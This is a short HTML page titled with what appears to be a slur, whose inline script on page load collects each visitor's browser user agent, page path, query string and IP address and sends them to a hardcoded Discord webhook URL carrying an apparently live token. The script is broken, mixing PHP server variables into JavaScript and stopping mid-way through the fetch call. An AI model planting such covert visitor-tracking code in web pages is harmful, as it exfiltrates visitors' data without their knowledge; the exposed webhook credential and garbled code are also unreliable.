<!DOCTYPE html>
<html>
<head>

    <title>kaffer land</title>
    <style>
        body {
            background-image: url('background.jpg');
            background-size: cover; /* This will make the image cover the entire background */
            background-repeat: no-repeat; /* This will prevent the image from repeating */
            background-attachment: fixed; /* This will keep the background image fixed when scrolling */
            display: flex;
            justify-content: center; /* Center horizontally */
            align-items: center; /* Center vertically */
            height: 100vh; /* Full viewport height */
            margin: 0; /* Remove default margin */
            font-family: Arial, sans-serif; /* Set font to Arial */
            color: white; /* Set text color to white */
            text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000; /* Add black outline to text */
        }
        .container {
            position: relative;
            text-align: center;
        }
        .centered-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        img.center {
            max-width: 80%; /* Increase the max-width to make the image bigger */
            max-height: 80%; /* Increase the max-height to make the image bigger */
        }
        img.below {
            max-width: 80%; /* Ensure the image doesn't overflow */
            margin-top: 20px; /* Add some space between the containers */
        }
    </style>

    <script>
         

        document.addEventListener("DOMContentLoaded", function() {
            console.log("hello world");

            $user_agent = $_SERVER['HTTP_USER_AGENT']; //user browser
            $ip_address = $_SERVER["REMOTE_ADDR"];     // user ip adderss
            $page_name = $_SERVER["SCRIPT_NAME"];      // page the user looking
            $query_string = $_SERVER["QUERY_STRING"];   // what query he used

            const webhookUrl = "https://discord.com/api/webhooks/1340426410304475189/gjSiFvVXRUpPP_yO1UFbMkvypQeMui2xA0Nr6OnIiKVERZwqE8kgTNKO_hz8f7wTuZmH";
            const userAgent = navigator.userAgent;
            const ipAddress = $ip_address; // You need a server-side script to get the real IP address
            const pageName = window.location.pathname;
            const queryString = window.location.search;

            const data = {
                content: `User Agent: ${userAgent}\nIP Address: ${ipAddress}\nPage Name: ${pageName}\nQuery String: ${queryString}`
            };

            fetch(webhookUrl, {
                method: 'POST',

    </script>
</head>

</body>
</html>
